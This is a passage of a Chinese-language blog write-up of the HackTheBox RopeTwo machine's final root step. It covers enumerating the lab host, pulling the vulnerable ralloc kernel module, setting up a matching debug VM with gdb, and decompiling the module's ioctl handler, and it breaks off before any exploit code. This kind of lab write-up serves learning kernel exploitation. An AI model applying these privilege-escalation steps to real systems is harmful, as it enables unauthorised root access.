<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.0.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"fdlucifer.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":null,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取root权限的ralloc KASLR linux内核堆ROP利用部分。  到这一步之前，建议先看前两个步骤: HackTheBox-RopeTwo-[PWN-Chrome-V8引擎] HackTheBox-RopeTwo-[pwn-rshell]  本篇文章是hackthebox - ropetwo机器的最后一个部分, 进">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/index.html">
<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
<meta property="og:description" content="前言此篇文章专门记录hack the box - ropetwo机器中获取root权限的ralloc KASLR linux内核堆ROP利用部分。  到这一步之前，建议先看前两个步骤: HackTheBox-RopeTwo-[PWN-Chrome-V8引擎] HackTheBox-RopeTwo-[pwn-rshell]  本篇文章是hackthebox - ropetwo机器的最后一个部分, 进">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot1.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot2.jpg">
<meta property="article:published_time" content="2021-02-26T18:37:37.000Z">
<meta property="article:modified_time" content="2021-02-27T09:10:52.081Z">
<meta property="article:author" content="lUc1f3r11">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg">

<link rel="canonical" href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP] | lUc1f3r11's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lUc1f3r11's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">39</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">29</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">135</span></a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/02/27/hackthebox-rope2-getroot/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/lucifer11.jpg">
      <meta itemprop="name" content="lUc1f3r11">
      <meta itemprop="description" content="all things about infosec & ctf">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lUc1f3r11's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HackTheBox-RopeTwo-[ralloc-KASLR-kernel-ROP]
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-02-27 02:37:37 / Modified: 17:10:52" itemprop="dateCreated datePublished" datetime="2021-02-27T02:37:37+08:00">2021-02-27</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此篇文章专门记录hack the box - ropetwo机器中获取root权限的ralloc KASLR linux内核堆ROP利用部分。</p>
<ul>
<li>到这一步之前，建议先看前两个步骤:</li>
<li><a href="https://fdlucifer.github.io/2021/01/23/chrome-browserv8-pwn/">HackTheBox-RopeTwo-[PWN-Chrome-V8引擎]</a></li>
<li><a href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/">HackTheBox-RopeTwo-[pwn-rshell]</a></li>
</ul>
<p>本篇文章是hackthebox - ropetwo机器的最后一个部分, 进行内核调试漏洞利用。</p>
<a id="more"></a>

<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>当在寻找从chromeuser升级到r4j的方法时，运行了一个find查询来查找r4j拥有的文件。在上面展示了对该用户拥有的文件的搜索，对r4j组拥有的文件的搜索还返回了一些有趣的东西:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ find / -<span class="built_in">type</span> f -group r4j -ls 2&gt;/dev/null | grep -v -e <span class="string">&quot; \/proc&quot;</span> -e <span class="string">&quot; \/sys&quot;</span></span><br><span class="line">  1054414      8 -rw-r-----   1 root     r4j          5856 Jun  1  2020 /usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko</span><br><span class="line">  1056436     16 -rwsr-xr-x   1 r4j      r4j         14312 Feb 24  2020 /usr/bin/rshell</span><br><span class="line">  1054405      4 -rwx------   1 r4j      r4j          3771 Apr  4  2019 /home/r4j/.bashrc</span><br><span class="line">  1056441      4 -rw-r-----   1 root     r4j            33 Feb 26 17:52 /home/r4j/user.txt</span><br><span class="line">  1054406      4 -rwx------   1 r4j      r4j           807 Apr  4  2019 /home/r4j/.profile</span><br><span class="line">  1054407      4 -rwx------   1 r4j      r4j           220 Apr  4  2019 /home/r4j/.bash_logout</span><br><span class="line">  1054423      0 -rw-r--r--   1 r4j      r4j             0 Feb 23  2020 /home/r4j/.cache/motd.legal-displayed</span><br></pre></td></tr></table></figure>

<p>ralloc.ko是一个内核模块。在/dev中有一个匹配的设备:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:/dev$ ls -l ralloc</span><br><span class="line">crw-r--r-- 1 root root 10, 52 Feb 26 17:52 ralloc</span><br></pre></td></tr></table></figure>

<p>使用scp获取模块的副本:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># scp -i id_rsa r4j@10.10.10.196:/usr/lib/modules/5.0.0-38-generic/kernel/drivers/ralloc/ralloc.ko .</span></span><br><span class="line">ralloc.ko                                                                                                          100% 5856    20.2KB/s   00:00    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">chrome  gdb-rshell.init  id_rsa.pub            libc-2.29.so-debug                 libc.so.6-ropetwo  pwn_rshell.py  rshell    xpl.js</span><br><span class="line">exp.py  id_rsa           ld-linux-x86-64.so.2  libc6-dbg_2.29-0ubuntu2_amd64.deb  patch.diff         ralloc.ko      xpl.html</span><br></pre></td></tr></table></figure>

<p>还需要一些关于RopeTwo的额外信息，以便复制环境。操作系统和内核版本:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r4j@rope2:~$ cat /etc/lsb-release</span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=19.04</span><br><span class="line">DISTRIB_CODENAME=disco</span><br><span class="line">DISTRIB_DESCRIPTION=<span class="string">&quot;Ubuntu 19.04&quot;</span></span><br><span class="line">r4j@rope2:~$ uname -a</span><br><span class="line">Linux rope2 5.0.0-38-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>查看内核正在运行的保护，查看/proc/cpuinfo。对于每个处理器，都看到了flag smep，它代表<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU3VwZXJ2aXNvcl9Nb2RlX0FjY2Vzc19QcmV2ZW50aW9u">监督模式执行保护<i class="fa fa-external-link-alt"></i></span>。这意味着不能在内核中运行用户空间代码。相反，需要在漏洞开发利用过程中使用ROP来实现目标。</p>
<h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>因为内核模块是特定于内核的，所以想在本地VM中创建相同的环境。要访问Linux主机，最简单的方法是使用QEMU。这篇<span class="exturl" data-url="aHR0cHM6Ly93d3cubnVsbGJ5dGUuY2F0L3Bvc3QvbGludXgta2VybmVsLWV4cGxvaXQtZGV2ZWxvcG1lbnQtZW52aXJvbm1lbnQvI2Vudmlyb25tZW50LXNldHVw">博文<i class="fa fa-external-link-alt"></i></span>详细介绍了这个过程，但是本篇文章使用ubuntu 19.04 vm虚拟机系统来调试。</p>
<h3 id="搭建VM"><a href="#搭建VM" class="headerlink" title="搭建VM"></a>搭建VM</h3><p>下载<span class="exturl" data-url="aHR0cDovL29sZC1yZWxlYXNlcy51YnVudHUuY29tL3JlbGVhc2VzL2Rpc2NvLw==">Ubuntu 19.04的iso<i class="fa fa-external-link-alt"></i></span>，抓取了non-live的iso，并构建了一个新的VM。让它处于NAT模式，但添加了<span class="exturl" data-url="aHR0cHM6Ly9oaXRjaGhpa2luZ3RoZXdlYi53b3JkcHJlc3MuY29tLzIwMTQvMDkvMDIvcG9ydGZvcndhcmRpbmctd2l0aC12bXdhcmUtcGxheWVyLWFuZC1uYXQv">端口转发<i class="fa fa-external-link-alt"></i></span>，这样就可以SSH进入它, 也可以自己配置sshd来连接ssh。</p>
<p>安装好之后，虚拟机已经运行的内核:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># uname -a</span></span><br><span class="line">Linux ubuntu 5.0.0-13-generic <span class="comment">#41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure>

<p>如果没有的话，它可以通过apt获得，所以可以使用sudo apt install linux-image-5.0.0-38-generic进行安装。</p>
<ul>
<li>注意这里更新源要使用old-release的源，否则安装内核不成功，其他方法安装内核容易报错。</li>
</ul>
<p>还需要调试symbols包，从<span class="exturl" data-url="aHR0cDovL2xhdW5jaHBhZGxpYnJhcmlhbi5uZXQvNDU0MDI4NDcyL2xpbnV4LWltYWdlLXVuc2lnbmVkLTUuMC4wLTM4LWdlbmVyaWMtZGJnc3ltXzUuMC4wLTM4LjQxX2FtZDY0LmRkZWI=">这里<i class="fa fa-external-link-alt"></i></span>获取并安装(花了一些时间):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># dpkg -i linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb</span></span><br><span class="line">Selecting previously unselected package linux-image-unsigned-5.0.0-38-generic-dbgsym.</span><br><span class="line">(Reading database ... 171311 files and directories currently installed.)</span><br><span class="line">Preparing to unpack linux-image-unsigned-5.0.0-38-generic-dbgsym_5.0.0-38.41_amd64.ddeb ...</span><br><span class="line">Unpacking linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...</span><br><span class="line">Setting up linux-image-unsigned-5.0.0-38-generic-dbgsym (5.0.0-38.41) ...</span><br></pre></td></tr></table></figure>

<p>要做的最后一件事是进入这个虚拟机的.vmx文件并添加:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64 = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>这会在主机127.0.0.1:8864上启动一个监听器，可以将gdb连接到这个监听器上。如果需要从另一个主机连接，可以添加第二行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64.remote = <span class="string">&quot;TRUE&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果有这一行，监听器将在0.0.0.0:8864上。</p>
<p>如果因为某些原因想改变端口，这样做(但将只使用默认端口):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.port.guest64 = <span class="string">&quot;8865&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="安装ralloc"><a href="#安装ralloc" class="headerlink" title="安装ralloc"></a>安装ralloc</h3><p>将通过SSH或使用VMWare Tools将模块复制到VM中，以便在VM中共享一个文件夹。要加载模块，可以简单地使用insmod(插入模块):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ sudo insmod ./ralloc.ko</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="built_in">test</span>:</span><br></pre></td></tr></table></figure>

<p>现在它显示在lsmod(列表模块)中，并且创建了设备:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ lsmod | grep ralloc</span><br><span class="line">ralloc                 16384  0</span><br><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ ls /dev/ralloc</span><br><span class="line">/dev/ralloc</span><br></pre></td></tr></table></figure>

<p>可以通过在/proc/modules中grepping找到它在内存中的地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ sudo cat /proc/modules | grep ralloc</span><br><span class="line">ralloc 16384 0 - Live 0xffffffffc0605000 (OE)</span><br></pre></td></tr></table></figure>

<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>从PowerShell导入一个wsl bash shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; bash</span><br><span class="line"><span class="built_in">test</span>@DESKTOP-9LSPC40:/mnt/c/Users/Administrator$</span><br></pre></td></tr></table></figure>

<p>按照页面上的说明在这个环境中安装<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1Z3N5L2dlZg==">GEF<i class="fa fa-external-link-alt"></i></span>(尝试过<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvbmdsZC9wZWRh">Peda<i class="fa fa-external-link-alt"></i></span>，但它与内核调试不太匹配)。</p>
<p>当运行gdb时，需要将它指向正在调试的内核。因为已经安装了调试symbols，所以可以把内核从/usr/lib/debug/boot中取出:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/debug/boot/vmlinux-5.0.0-38-generic</span><br></pre></td></tr></table></figure>

<p>现在将在内核文件上启动gdb，并将目标设置为remote:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-9LSPC40:~/rope2<span class="comment"># gdb -q ./vmlinux-5.0.0-38-generic</span></span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">92 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">92 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./vmlinux-5.0.0-38-generic...</span><br><span class="line">gef➤  target remote:8864</span><br><span class="line">Remote debugging using :8864</span><br></pre></td></tr></table></figure>

<p>现在，要把ralloc文件添加到本地gdb实例中。这使gdb能够设置断点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  add-symbol-file ralloc.ko 0xffffffffc0605000</span><br><span class="line">add symbol table from file <span class="string">&quot;ralloc.ko&quot;</span> at</span><br><span class="line">        .text_addr = 0xffffffffc05fb000</span><br><span class="line">Reading symbols from ralloc.ko...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ralloc.ko)</span><br></pre></td></tr></table></figure>

<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="通用结构"><a href="#通用结构" class="headerlink" title="通用结构"></a>通用结构</h3><p>需要弄清楚这个模块做什么，所以将在Ghidra打开ralloc.ko。该模块导出了两个函数，rope2_init 和 rope2_exit:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg"></li>
</ul>
<p>它们都非常简单，rope2_init调用misc_register, rope2_exit调用misc_dereregister来创建和删除设备。还有其他一些函数，但只有一个真正有趣，是rope2_ioctl。</p>
<h3 id="IOCTL"><a href="#IOCTL" class="headerlink" title="IOCTL"></a>IOCTL</h3><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>这段代码有两个用于管理数据的结构体，所以花了一分钟阅读代码，看看这些结构是如何使用的，然后在Ghidra中创建它们。我第一个调用了ralloc_in，它被用来管理通过ioctl传递的数据被调用:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot1.jpg"></li>
</ul>
<p>另一个命名为ralloc_array。这用于命名为buffers的全局变量，该变量最多可以容纳32 (0x20)个缓冲区。每个对象为缓冲区存储一个大小和一个地址:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot2.jpg"></li>
</ul>
<h3 id="rope2-ioctl"><a href="#rope2-ioctl" class="headerlink" title="rope2_ioctl"></a>rope2_ioctl</h3><p>一旦将这些应用到代码中的变量上，就会得到非常清晰的结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">long rope2_ioctl(undefined8 fd,int ioctl_num)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long addr;</span><br><span class="line">  long user_input_;</span><br><span class="line">  ulong id;</span><br><span class="line">  long <span class="built_in">return</span>;</span><br><span class="line">  long in_GS_OFFSET;</span><br><span class="line">  long user_input;</span><br><span class="line">  ulong user_input.size;</span><br><span class="line">  void *user_input.data;</span><br><span class="line">  long _canary;</span><br><span class="line">  long canary;</span><br><span class="line">  void *__src;</span><br><span class="line">  void *__dest;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  canary = *(long *)(in_GS_OFFSET + 0x28);</span><br><span class="line">  mutex_lock(lock);</span><br><span class="line">  _copy_from_user(&amp;user_input,user_input_,0x18);</span><br><span class="line">  <span class="keyword">if</span> (ioctl_num == 0x1000) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((user_input.size &lt; 0x401) &amp;&amp; ((uint)user_input &lt; 0x20)) &#123;</span><br><span class="line">      id = (ulong)(uint)user_input * 0x10;</span><br><span class="line">      <span class="keyword">if</span> (*(long *)(arr + id + 8) == 0) &#123;</span><br><span class="line">        addr = __kmalloc(user_input.size,0x6000c0);</span><br><span class="line">        *(long *)(arr + id + 8) = addr;</span><br><span class="line">        <span class="keyword">if</span> (addr != 0) &#123;</span><br><span class="line">          *(ulong *)(arr + id) = user_input.size + 0x20;</span><br><span class="line">          <span class="built_in">return</span> = 0;</span><br><span class="line">          goto LAB_00100104;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl_num == 0x1001) &#123;</span><br><span class="line">      <span class="keyword">if</span> 